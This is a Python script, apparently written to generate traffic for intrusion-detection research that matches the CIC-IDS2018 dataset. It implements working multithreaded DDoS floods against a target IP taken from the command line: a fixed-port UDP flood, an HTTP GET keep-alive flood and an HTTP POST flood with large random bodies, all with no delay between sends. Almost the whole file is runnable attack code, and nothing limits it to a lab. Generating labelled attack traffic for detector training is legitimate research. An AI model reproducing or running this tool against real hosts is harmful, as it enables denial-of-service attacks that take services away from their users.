"""
DDoS Attack - Distributed Denial of Service
Replicates CIC-IDS2018 DDoS attack tool behaviors:
  - LOIC-HTTP:  High-volume HTTP GET flood (many requests per persistent connection)
  - LOIC-UDP:   High-volume UDP flood to a FIXED port (all packets in same flow)
  - HOIC:       HTTP POST flood with large payloads (boosted LOIC variant)

Key differences from DoS: higher volume, more threads, and UDP flooding.
CICFlowMeter must see flows with very high packet counts and byte volumes.
"""

import socket
import threading
import time
import random
import string

# TCP receive buffer sizes matching CICIDS2018 training data.
# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
# which the model uses for classification (Init Fwd Win Byts feature).
_RCVBUF_LOIC_HTTP = 8192
_RCVBUF_HOIC = 32738

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


class DDoSAttack:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.packet_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.packet_count += n

    # ──────────────────────────────────────────────────────
    # LOIC-UDP — High-volume UDP flood to a FIXED port
    #   All packets to the SAME dst_port so CICFlowMeter groups
    #   them into ONE flow with extremely high packet count.
    #   Creates flows with: very high Tot Fwd Pkts, high
    #   TotLen Fwd Pkts, very low Flow IAT, Protocol=17 (UDP).
    # ──────────────────────────────────────────────────────
    def udp_flood(self):
        """LOIC-UDP: Flood fixed target port with UDP packets at max rate.
        Unlike the old version that sent to random ports (creating useless 1-pkt flows),
        this targets a FIXED port so all packets aggregate into one flow."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + self.duration

        # Fixed payload sizes matching LOIC behavior
        payload_sizes = [512, 1024, 1400]

        while self.running and time.time() < end_time:
            try:
                payload_size = random.choice(payload_sizes)
                data = random.randbytes(payload_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(payload_size))
                # Send to FIXED port (same 5-tuple = same CICFlowMeter flow)
                sock.sendto(data, (self.target_ip, self.target_port))
                self._inc_count()
            except Exception:
                pass
            # Minimal delay for maximum packet rate
        sock.close()

    # ──────────────────────────────────────────────────────
    # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
    #   Creates flows with: very high Tot Fwd Pkts, very high
    #   Flow Pkts/s, high TotLen Fwd Pkts, many PSH flags.
    # ──────────────────────────────────────────────────────
    def http_flood(self):
        """LOIC-HTTP: Rapid HTTP GET requests over persistent TCP connections.
        Sends hundreds of requests per connection at maximum speed."""
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_LOIC_HTTP)
                sock.connect((self.target_ip, self.target_port))

                # Blast requests on same connection — maximum speed
                for _ in range(random.randint(100, 500)):
                    if not self.running or time.time() >= end_time:
                        break

                    path = f"/{_random_string(6)}?{_random_string(4)}={_random_string(8)}"
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Drain response without waiting
                    try:
                        sock.settimeout(0.01)
                        sock.recv(8192)
                    except socket.timeout:
                        pass
                    sock.settimeout(10)

                    # No sleep — LOIC fires as fast as possible

                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # HOIC — HTTP POST flood with large payloads ("boosters")
    #   Creates flows with: high forward bytes, large Fwd Pkt
    #   Len Mean/Max, high TotLen Fwd Pkts.
    # ──────────────────────────────────────────────────────
    def hoic_flood(self):
        """HOIC: HTTP POST flood with large payloads.
        HOIC uses 'boosters' — scripts that generate large POST bodies
        to amplify the bandwidth consumed per request."""
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
                sock.connect((self.target_ip, self.target_port))

                for _ in range(random.randint(50, 150)):
                    if not self.running or time.time() >= end_time:
                        break

                    # Large random POST body (HOIC booster style)
                    body = _random_string(random.randint(1024, 8192))
                    path = f"/{_random_string(6)}"
                    req = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Drain response
                    try:
                        sock.settimeout(0.01)
                        sock.recv(8192)
                    except socket.timeout:
                        pass
                    sock.settimeout(10)

                sock.close()
            except Exception:
                pass

    def run_attack(self, num_threads=10):
        """Run DDoS attack with multiple threads."""
        print(f"[DDoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
        print(f"[DDoS] Techniques: LOIC-HTTP + LOIC-UDP + HOIC")
        print(f"[DDoS] Using {num_threads} threads")

        techniques = [
            self.udp_flood,
            self.http_flood,
            self.hoic_flood,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"DDoS-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[DDoS] Attack completed in {elapsed:.2f}s — Sent {self.packet_count} packets")


def run_ddos(target_ip, target_port=80, duration=60, threads=10):
    """Convenience function to run DDoS attack"""
    attack = DDoSAttack(target_ip, target_port, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_ddos(target_ip, duration=duration)
    else:
        print("Usage: python _2_ddos_simulation.py <target_ip> [duration]")
